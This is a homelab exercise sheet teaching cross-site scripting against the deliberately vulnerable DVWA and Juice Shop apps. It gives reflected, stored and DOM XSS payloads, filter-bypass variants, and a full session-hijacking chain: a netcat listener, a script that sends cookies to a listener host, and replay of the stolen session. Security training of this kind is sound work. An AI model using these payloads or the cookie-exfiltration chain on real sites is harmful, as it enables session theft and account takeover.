# 🔬 Lab Exercise 2: XSS (Cross-Site Scripting) Basics

> **Challenge:** Inject and execute JavaScript through user input fields
> **Where:** DVWA on Metasploitable + Juice Shop on Kali
> **Time:** ~50-60 minutes

---

## Exercise 2A: Reflected XSS on DVWA (Low Security)

**Target:** `http://192.168.56.20/dvwa/vulnerabilities/xss_r/`

> **Prerequisite:** DVWA security set to **Low**

```
Step 1: Understand the page
  - Go to http://192.168.56.20/dvwa/vulnerabilities/xss_r/
  - Enter your name: John
  - Click Submit
  ✅ EXPECTED: "Hello John" displayed on page
  📝 Your input is reflected directly in the HTML output

Step 2: Test for XSS vulnerability
  - Enter: <script>alert('XSS')</script>
  - Click Submit
  ✅ EXPECTED: An alert box pops up with "XSS"!
  📝 The server didn't sanitize your input

Step 3: Steal cookies via XSS
  - Enter: <script>alert(document.cookie)</script>
  - Click Submit
  ✅ EXPECTED: Alert shows your PHPSESSID and security cookies
  📝 Write down the cookies shown: ______________

Step 4: Check the URL
  - Look at the browser address bar after submitting
  - 📝 Is your payload visible in the URL? (This is reflected XSS)
  - Copy the URL — this malicious URL could be sent to a victim
  - 📝 Malicious URL: ______________
```

---

## Exercise 2B: Stored XSS on DVWA (Low Security)

**Target:** `http://192.168.56.20/dvwa/vulnerabilities/xss_s/`

```
Step 1: Normal usage — post a guestbook entry
  - Go to http://192.168.56.20/dvwa/vulnerabilities/xss_s/
  - Name: TestUser
  - Message: Hello World
  - Click "Sign Guestbook"
  ✅ EXPECTED: Your message appears in the guestbook
  📝 Notice: your entry persists — it's stored in the database

Step 2: Inject stored XSS
  - Name: Hacker
  - Message: <script>alert('Stored XSS')</script>
  - Click "Sign Guestbook"
  ✅ EXPECTED: Alert pops up immediately
  📝 Now refresh the page (F5)
  ✅ EXPECTED: Alert pops up AGAIN on every page load!
  📝 This is why stored XSS is more dangerous than reflected

Step 3: Inject cookie-stealing payload
  - Name: Attacker
  - Message: <script>alert(document.cookie)</script>
  - Click "Sign Guestbook"
  ✅ EXPECTED: Every visitor to this page now sees the cookies alert
  📝 In a real attack, cookies would be sent to attacker's server

Step 4: Reset the guestbook (clean up)
  - Look for a "Clear Guestbook" button or go to:
    http://192.168.56.20/dvwa/setup.php → Reset Database
  - This removes your stored XSS payloads
```

---

## Exercise 2C: XSS Filter Bypass at Medium Security

**Target:** DVWA XSS Reflected at **Medium** security

```
Step 1: Change DVWA security to Medium
  - Go to http://192.168.56.20/dvwa/security.php → set to "Medium"

Step 2: Try the basic payload
  - Go to http://192.168.56.20/dvwa/vulnerabilities/xss_r/
  - Enter: <script>alert('XSS')</script>
  - Click Submit
  📝 What happened? (The <script> tag is likely filtered!)
  📝 What output do you see instead?

Step 3: Try event handler bypass
  - Enter: <img src=x onerror=alert('XSS')>
  - Click Submit
  ✅ EXPECTED: Alert box pops up!
  📝 The filter only blocks <script> tags, not event handlers

Step 4: Try more bypass techniques
  # Mixed case
  <ScRiPt>alert('XSS')</ScRiPt>

  # Double tag (filter removes first, second executes)
  <scr<script>ipt>alert('XSS')</script>

  # SVG tag
  <svg onload=alert('XSS')>

  # Body tag
  <body onload=alert('XSS')>

  # Input with autofocus
  <input onfocus=alert('XSS') autofocus>

  📝 Which bypass techniques worked at Medium security?
  📝 List working payloads: ______________
```

---

## Exercise 2D: DOM-Based XSS on DVWA

**Target:** `http://192.168.56.20/dvwa/vulnerabilities/xss_d/`

> Set DVWA security back to **Low** for this exercise.

```
Step 1: Understand DOM-based XSS
  - Go to http://192.168.56.20/dvwa/vulnerabilities/xss_d/
  - Select a language from the dropdown
  - 📝 Look at the URL — notice the "default=" parameter
  - 📝 Check View Source (Ctrl+U) — the value is used in client-side JS

Step 2: Inject via URL parameter
  - Modify the URL directly in the address bar:
    http://192.168.56.20/dvwa/vulnerabilities/xss_d/?default=<script>alert('DOM XSS')</script>
  - Press Enter
  ✅ EXPECTED: Alert box pops up
  📝 This XSS happens entirely in the browser (DOM manipulation)

Step 3: Try a more stealthy payload
  - URL: ...?default=English</option></select><img src=x onerror=alert('DOM')>
  - Press Enter
  📝 Did this work? Why is DOM XSS different from reflected XSS?

Step 4: View the page source vs Inspect Element
  - Right-click → View Page Source (Ctrl+U)
  - 📝 Is your payload in the HTML source? (No — it's DOM-based)
  - Right-click → Inspect Element
  - 📝 Is your payload in the live DOM? (Yes!)
  - 📝 This is the key difference: DOM XSS modifies the live page, not server response
```

---

## Exercise 2E: XSS on Juice Shop

**Target:** Juice Shop at `http://localhost:3000`

```
Step 1: Find the XSS challenge
  - Go to http://localhost:3000/#/score-board
  - Look for XSS-related challenges:
    - "DOM XSS" (⭐ difficulty)
    - "Bonus Payload" (⭐ difficulty)
  📝 Note the challenge descriptions

Step 2: DOM XSS on Juice Shop search
  - Go to the search bar (🔍 icon at top)
  - Enter: <iframe src="javascript:alert('xss')">
  - Press Enter
  ✅ EXPECTED: Alert pops up — challenge solved!
  📝 Check the score-board to confirm

Step 3: Try reflected XSS via URL
  - Try navigating to:
    http://localhost:3000/#/search?q=<script>alert('xss')</script>
  📝 Does this work? Why or why not?

Step 4: Try stored XSS via product review
  - Go to any product page
  - Add a review with XSS payload:
    Great product! <script>alert('stored')</script>
  - Submit the review
  📝 Does the payload execute when viewing the product page?
  📝 Is the input sanitized?
```

---

## Exercise 2F: Cookie Stealing Simulation

**Task:** Simulate a real XSS cookie theft attack on your homelab.

```bash
# Step 1: Start a listener on Kali to catch stolen cookies
nc -lvnp 4444 &
# This simulates the attacker's server listening for stolen data

# Step 2: Inject the cookie-stealing XSS payload on DVWA (Low, Reflected)
# Go to http://192.168.56.20/dvwa/vulnerabilities/xss_r/
# Enter this payload:
<script>new Image().src="http://192.168.56.10:4444/?cookie="+document.cookie</script>

# Step 3: Check your netcat listener
# ✅ EXPECTED: You see a GET request hit your listener with the cookies
# Output will look like:
# GET /?cookie=PHPSESSID=abc123;security=low HTTP/1.1

# Step 4: Use the stolen session cookie
# In a different browser or incognito window:
# F12 → Console →
document.cookie = "PHPSESSID=<stolen_value>; path=/dvwa/"
document.cookie = "security=low; path=/dvwa/"
# Navigate to http://192.168.56.20/dvwa/
# 📝 Are you logged in as the victim?
# ✅ This demonstrates the full XSS → session hijacking attack chain

# Step 5: Kill the listener
fg
# Press Ctrl+C
```

---

## ✅ Completion Checklist

- [ ] Performed reflected XSS on DVWA — stole cookies via alert (2A)
- [ ] Performed stored XSS on DVWA — persistent payload in guestbook (2B)
- [ ] Bypassed XSS filters at Medium security with event handlers (2C)
- [ ] Exploited DOM-based XSS via URL parameter manipulation (2D)
- [ ] Solved Juice Shop XSS challenges (2E)
- [ ] Simulated full cookie theft attack with netcat listener (2F)

---

**Next:** [Challenge 12: Brute Force Login →](./03_lab_bruteforce_login.md)
